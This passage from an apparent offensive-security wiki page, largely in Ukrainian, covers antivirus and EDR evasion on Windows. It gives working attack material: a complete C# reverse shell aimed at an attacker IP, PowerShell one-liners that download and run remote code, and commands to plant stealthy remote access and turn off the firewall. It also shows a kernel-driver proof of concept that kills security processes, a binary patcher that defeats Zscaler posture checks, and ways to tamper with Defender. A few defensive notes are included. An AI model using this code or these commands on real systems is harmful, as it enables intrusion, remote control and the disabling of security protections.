for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм логування в Windows, який дозволяє додаткам та системним компонентам **реєструвати події**. Однак його також можуть використовувати продукти безпеки для моніторингу та виявлення шкідливої активності.

Подібно до того, як AMSI вимикається (bypassed), також можливо змусити функцію **`EtwEventWrite`** користувацького процесу повертатися миттєво без реєстрації подій. Це робиться шляхом патчу функції в пам'яті так, щоб вона одразу повертала управління, фактично вимикаючи ETW-логування для цього процесу.

Більше інформації можна знайти в **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Завантаження C# binaries у пам'ять відоме вже довгий час і все ще є чудовим способом запуску ваших post-exploitation інструментів, не потрапивши в поле зору AV.

Оскільки payload буде завантажено безпосередньо в пам'ять без торкання диска, нам доведеться турбуватися лише про патчинг AMSI для всього процесу.

Більшість C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, тощо) вже надають можливість виконувати C# assemblies безпосередньо в пам'яті, але існують різні способи зробити це:

- **Fork\&Run**

Це передбачає **створення нового жертвенного процесу**, інжекцію вашого post-exploitation шкідливого коду в цей новий процес, виконання шкідливого коду і після завершення — завершення цього процесу. Це має як переваги, так і недоліки. Перевага методу fork and run у тому, що виконання відбувається **поза** нашим Beacon implant процесом. Це означає, що якщо щось піде не так або буде виявлено під час post-exploitation дій, є **набагато більший шанс**, що наш **implant виживе.** Недолік у тому, що ви маєте **вищий шанс** бути виявленим за допомогою **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Це про інжекцію post-exploitation шкідливого коду **в той самий процес**. Таким чином ви уникаєте створення нового процесу та його сканування AV, але недолік у тому, що якщо щось піде не так під час виконання вашого payload, є **набагато більший шанс** **втратити ваш beacon**, оскільки процес може впасти.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо ви хочете дізнатися більше про C# Assembly loading, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їх InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ви також можете завантажувати C# Assemblies **з PowerShell**, див. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) та [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можливо виконувати шкідливий код іншими мовами, надавши скомпрометованій машині доступ **до середовища інтерпретатора, встановленого на Attacker Controlled SMB share**.

Надавши доступ до Interpreter Binaries та середовища на SMB share, ви можете **виконувати довільний код в цих мовах у пам'яті** скомпрометованої машини.

У репозиторії вказано: Defender все ще сканує скрипти, але, використовуючи Go, Java, PHP тощо, ми маємо **більшу гнучкість для обходу статичних сигнатур**. Тестування з випадковими необфусцированими reverse shell скриптами цими мовами показало успіх.

## TokenStomping

Token stomping — це техніка, яка дозволяє зловмиснику **маніпулювати access token або security prouct, наприклад EDR чи AV**, дозволяючи зменшити його привілеї так, що процес не загинув би, але не матиме дозволів перевіряти шкідливу активність.

Щоб запобігти цьому, Windows могла б **заборонити зовнішнім процесам** отримувати хендли до токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Як описано в [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), легко просто розгорнути Chrome Remote Desktop на ПК жертви, а потім використати його для takeover та підтримки persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).


## Advanced Evasion

Evasion — дуже складна тема, іноді потрібно враховувати багато різних джерел телеметрії в одній системі, тому майже неможливо залишатися повністю непоміченим у зрілих середовищах.

Кожне середовище, з яким ви стикаєтесь, матиме свої сильні та слабкі сторони.

Я настійно рекомендую переглянути цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати уявлення про більш просунуті Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

his is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Ви можете використовувати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який буде **послійно видаляти частини бінарника**, доки не **виявить, яку саме частину Defender** позначає як шкідливу, і поділить її для вас.\
Ще один інструмент, що робить **те саме**, — [**avred**](https://github.com/dobin/avred) з відкритим веб-сервісом за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 всі Windows постачалися з **Telnet server**, який ви могли встановити (як адміністратор), зробивши:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Зробіть так, щоб він **запускався**, коли система запускається, і **запустіть** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змінити telnet port** (stealth) та вимкнути firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (вибирайте bin downloads, а не setup)

**ON THE HOST**: Запустіть _**winvnc.exe**_ та налаштуйте сервер:

- Увімкніть опцію _Disable TrayIcon_
- Встановіть пароль у полі _VNC Password_
- Встановіть пароль у полі _View-Only Password_

Потім перемістіть бінарник _**winvnc.exe**_ та **щойно** створений файл _**UltraVNC.ini**_ на машину **victim**

#### **Reverse connection**

The **attacker** повинен **запустити на** своєму **host** бінарний файл `vncviewer.exe -listen 5900`, щоб він був **готовий** прийняти зворотне **VNC connection**. Потім, на **victim**: Запустіть демон winvnc `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Щоб зберегти прихованість, не робіть наступного

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Всередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` та **виконайте** **xml payload** за допомогою:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний захисник дуже швидко завершить процес.**

### Компіляція нашого власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# з використанням компілятора
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів для C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Приклад використання python для створення інжекторів:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 використовував маленьку консольну утиліту відому як **Antivirus Terminator**, щоб вимкнути endpoint-захист перед розгортанням ransomware. Інструмент приносить свій **власний вразливий але *signed* драйвер** і зловживає ним для виконання привілейованих операцій в kernel, які навіть Protected-Process-Light (PPL) AV сервіси не можуть заблокувати.

Key take-aways
1. **Signed driver**: Файл, записаний на диск — `ServiceMouse.sys`, але бінарник насправді є легітимно підписаним драйвером `AToolsKrnl64.sys` з “System In-Depth Analysis Toolkit” від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть коли увімкнено Driver-Signature-Enforcement (DSE).
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Перший рядок реєструє драйвер як **kernel service**, а другий запускає його, так що `\\.\ServiceMouse` стає доступним з user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Завершити будь-який процес по PID (використовується для вбивства Defender/EDR сервісів) |
| `0x990000D0` | Видалити будь-який файл на диску |
| `0x990001D0` | Вивантажити драйвер та видалити сервіс |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD повністю обходить захист на рівні user-mode; код, що виконується в kernel, може відкривати *protected* процеси, завершувати їх або змінювати kernel-об’єкти незалежно від PPL/PP, ELAM чи інших механізмів жорсткого захисту.

Detection / Mitigation
•  Увімкнути Microsoft-ів список блокування вразливих драйверів (`HVCI`, `Smart App Control`), щоб Windows відмовлявся завантажувати `AToolsKrnl64.sys`.  
•  Моніторити створення нових *kernel* сервісів і піднімати тривогу, коли драйвер завантажується з директорії, доступної для запису всім користувачам, або коли його немає в allow-list.  
•  Слідкувати за user-mode хендлами до кастомних device-об’єктів з наступними підозрілими викликами `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** застосовує правила device-posture локально і покладається на Windows RPC для передачі результатів іншим компонентам. Два слабких архітектурних рішення роблять повний байпас можливим:

1. Оцінка posture відбувається **повністю на клієнті** (серверу надсилається лише булеве значення).  
2. Внутрішні RPC endpoint-и перевіряють лише те, що підключуваний виконуваний файл **signed by Zscaler** (через `WinVerifyTrust`).

Шляхом **патчингу чотирьох signed бінарників на диску** обидва механізми можна нейтралізувати:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, отже кожна перевірка вважається compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ будь-який (навіть unsigned) процес може прив’язатися до RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Заміщено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Після заміни оригінальних файлів та перезапуску стека сервісів:

* **Усі** перевірки стану показують **зелені/відповідні**.
* Непідписані або змінені бінарні файли можуть відкривати named-pipe RPC endpoints (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Зламаний хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей кейс демонструє, як рішення про довіру, що приймаються виключно на стороні клієнта, та прості перевірки підпису можна обійти кількома байт-патчами.

## Зловживання Protected Process Light (PPL) для маніпуляцій з AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) реалізує ієрархію signer/level так, що лише процеси з рівнем не нижчим за інші можуть маніпулювати одне одним. Зловмисно: якщо ви легітимно можете запустити бінарник з підтримкою PPL і контролювати його аргументи, ви можете перетворити нешкідливу функціональність (наприклад, логування) на обмежений примітив запису, підкріплений PPL, проти захищених каталогів, які використовуються AV/EDR.

Що змушує процес працювати як PPL
- Цільовий EXE (та будь-які завантажені DLL) мають бути підписані з EKU, сумісним з PPL.
- Процес має бути створений за допомогою CreateProcess з прапорами: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно запитати сумісний protection level, що відповідає підписувачу бінарника (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для підписувачів антивірусів, `PROTECTION_LEVEL_WINDOWS` для підписувачів Windows). Невірні рівні призведуть до помилки при створенні.

Див. також ширше введення в PP/PPL та захист LSASS тут:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти для запуску
- Open-source helper: CreateProcessAsPPL (вибирає protection level і передає аргументи цільовому EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Схема використання:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` самозапускається і приймає параметр для запису лог-файлу у шлях, вказаний викликачем.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp не може розбирати шляхи, що містять пробіли; використовуйте 8.3 короткі шляхи, щоб вказати на зазвичай захищені локації.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Запустіть PPL-можливий LOLBIN (ClipUp) з `CREATE_PROTECTED_PROCESS`, використовуючи лаунчер (наприклад, CreateProcessAsPPL).
2) Передайте аргумент шляху лог-файлу ClipUp, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте 8.3 короткі імена.
3) Якщо цільовий бінарний файл зазвичай відкритий/заблокований AV під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час завантаження до запуску AV, встановивши сервіс автозапуску, який гарантовано працює раніше. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Ви не можете контролювати вміст, який записує ClipUp, окрім місця розміщення; примітив підходить для корупції, а не для точного інжекції контенту.
- Вимагає локального admin/SYSTEM для встановлення/запуску служби та наявності вікна для перезавантаження.
- Часовий фактор критичний: цільовий файл не повинен бути відкритим; виконання під час boot-а уникає блокувань файлів.

Detections
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо якщо батьківський процес — нестандартний лаунчер, поблизу boot-а.
- Нові служби, налаштовані на автозапуск підозрілих бінарників і які стабільно стартують до Defender/AV. Дослідіть створення/зміну служб до помилок старту Defender.
- Моніторинг цілісності файлів у бінарниках Defender/Platform; неочікувані створення/зміни файлів процесами з прапорами protected-process.
- ETW/EDR телеметрія: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, та аномальне використання рівнів PPL процесами, що не є AV-бінарниками.

Mitigations
- WDAC/Code Integrity: обмежте, які підписані бінарники можуть запускатися як PPL і під якими батьками; блокувати виклик ClipUp поза легітимними контекстами.
- Service hygiene: обмежте створення/зміну служб з автозапуском та моніторте маніпуляції порядком старту.
- Переконайтеся, що Defender tamper protection та early-launch protections увімкнені; дослідіть помилки запуску, які вказують на пошкодження бінарників.
- Розгляньте відключення 8.3 short-name generation на томах, де розміщено security tooling, якщо сумісно з вашим середовищем (ретельно протестуйте).

References for PPL and tooling
- Огляд Microsoft Protected Processes: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Довідка EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (перевірка порядку): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Опис техніки (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender обирає платформу, з якої запускається, перераховуючи підпапки під:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Воно вибирає підпапку з найвищим лексикографічним рядком версії (наприклад, `4.18.25070.5-0`), після чого запускає процеси служби Defender звідти (відповідно оновлюючи шляхи служби/реєстру). Цей вибір довіряє записам каталогів, включаючи directory reparse points (symlinks). Адміністратор може використати це, щоб перенаправити Defender на шлях, доступний для запису злоумисником, і досягти DLL sideloading або порушити роботу служби.

Preconditions
- Local Administrator (потрібен для створення каталогів/symlinks у папці Platform)
- Можливість перезавантаження або спричинити повторний вибір платформи Defender (перезапуск служби при boot-і)
- Потрібні лише вбудовані інструменти (mklink)

Why it works
- Defender блокує запис у своїх власних папках, але вибір платформи довіряє записам каталогів і обирає лексикографічно найвищу версію, не перевіряючи, чи ціль резольвиться до захищеного/довіреного шляху.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть symlink до директорії з вищою версією всередині Platform, який вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендовано перезавантаження):
```cmd
shutdown /r /t 0
```
4) Перевірте, що MsMpEng.exe (WinDefend) запущено з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Ви повинні бачити новий шлях процесу під `C:\TMP\AV\` і конфігурацію/реєстр служби, які відображають це розташування.

Післяексплуатаційні опції
- DLL sideloading/code execution: Drop/replace DLLs, які Defender завантажує зі свого application directory, щоб execute code у Defender’s processes. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Видаліть version-symlink, щоб при наступному запуску налаштований шлях не знаходився і Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Зауважте, що ця техніка сама по собі не забезпечує підвищення привілеїв; вона потребує прав адміністратора.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams можуть перемістити runtime evasion з C2 implant у сам цільовий модуль, підключивши його Import Address Table (IAT) і маршрутизуючи вибрані API через контрольований атакою, position‑independent code (PIC). Це розширює evasion за межі невеликої API‑поверхні, яку багато kitів експонують (наприклад, CreateProcessA), і поширює ті самі захисти на BOFs та post‑exploitation DLLs.

Загальний підхід
- Stage a PIC blob поруч із цільовим модулем, використовуючи reflective loader (prepended або companion). PIC має бути самодостатнім і position‑independent.
- Під час завантаження хост DLL пройти його IMAGE_IMPORT_DESCRIPTOR і запатчити записи IAT для цільових імпортів (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі PIC wrappers.
- Кожен PIC wrapper виконує evasions перед tail‑calling реальної адреси API. Типові evasions включають:
  - Memory mask/unmask навколо виклику (наприклад, encrypt beacon regions, RWX→RX, зміна імен/дозволів сторінок), потім відновлення після виклику.
  - Call‑stack spoofing: сформувати безпечний стек і перейти до цільового API так, щоб call‑stack analysis показував очікувані фрейми.
- Для сумісності експортуйте інтерфейс, щоб Aggressor script (або еквівалент) міг зареєструвати, які API підміняти для Beacon, BOFs та post‑ex DLLs.

Чому IAT hooking тут
- Працює для будь‑якого коду, який використовує підмінений імпорт, без зміни коду інструмента або залежності від Beacon для проксінгу конкретних API.
- Охоплює post‑ex DLLs: hooking LoadLibrary* дозволяє перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати ту саму masking/stack evasion до їхніх викликів API.
- Відновлює надійне використання команд post‑ex, що створюють процеси, проти детекцій на основі call‑stack, обгортаючи CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Примітки
- Застосуйте патч після релокацій/ASLR і перед першим використанням імпорту. Reflective loaders like TitanLdr/AceLdr демонструють хукінг під час DllMain завантаженого модуля.
- Тримайте wrappers маленькими і PIC-safe; отримуйте справжній API через оригінальне значення IAT, яке ви захопили перед патчингом, або через LdrGetProcedureAddress.
- Використовуйте переходи RW → RX для PIC і уникайте залишення writable+executable сторінок.

Call‑stack spoofing stub
- Draugr‑style PIC stubs будують фальшивий ланцюжок викликів (адреси повернення в безпечні модулі) і потім переходять до реального API.
- Це обходить виявлення, які очікують канонічні стеки від Beacon/BOFs до sensitive APIs.
- Комбінуйте з stack cutting/stack stitching techniques, щоб опинитися всередині очікуваних фреймів до прологу API.

Операційна інтеграція
- Додавайте reflective loader до post‑ex DLLs так, щоб PIC і hooks ініціалізувалися автоматично при завантаженні DLL.
- Використовуйте Aggressor script для реєстрації цільових API, щоб Beacon і BOFs прозоро користувалися тим самим шляхом ухилення без змін у коді.

Міркування для Detection/DFIR
- IAT integrity: записи, які резольвляться у non‑image (heap/anon) адреси; періодична перевірка вказівників імпорту.
- Stack anomalies: адреси повернення, що не належать завантаженим образам; різкі переходи до non‑image PIC; невідповідний родовід RtlUserThreadStart.
- Loader telemetry: in‑process записі в IAT, рання активність DllMain, що змінює import thunks, несподівані RX регіони, створені під час завантаження.
